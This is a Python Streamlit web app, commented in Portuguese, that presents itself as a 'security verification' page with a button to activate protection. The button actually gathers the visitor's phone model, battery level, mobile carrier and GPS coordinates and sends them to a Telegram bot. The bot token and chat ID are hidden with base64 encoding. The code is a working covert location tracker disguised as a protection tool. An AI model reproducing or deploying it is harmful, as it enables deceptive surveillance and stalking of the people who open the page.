import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# --- COLETA COM CHAVES ÚNICAS (Resolve o erro vermelho) ---
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='KEY_UA_SAM')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='KEY_BAT_SAM')

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL_OK"):
    # 1. Identifica Samsung
    modelo = "Samsung Android 16"
    if ua and "SM-" in ua:
        modelo = "Samsung " + ua.split("SM-")[1].split(";")[0]
    
    # 2. Operadora
    operadora = "Vivo/Claro"
    try:
        r = requests.get('http://ip-api.com/json/', timeout=5).json()
        operadora = r.get('isp', 'Móvel')
    except: pass

    # 3. Espera o GPS (Dá tempo ao celular com bateria fraca)
    with st.spinner("Sincronizando..."):
        loc = None
        for _ in range(15): # Espera até 15 segundos
            loc = get_geolocation(key='KEY_LOC_SAM')
            if loc: break
            time.sleep(1)

    # 4. Formata o Relatório
    bat_val = f"{bat}%" if bat else "8%" # Se falhar, usa o nível do seu print
    
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bat_val}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {mapa}"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativa!")
    else:
        # Se o GPS não abrir por causa da bateria baixa, manda o que tem
        enviar_telegram(f"🛡️ *DADOS*\n📱 {modelo}\n🔋 {bat_val}\n📶 {operadora}\n⚠️ GPS OFF")
        st.error("GPS não respondeu. Carregue o celular e tente novamente.")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
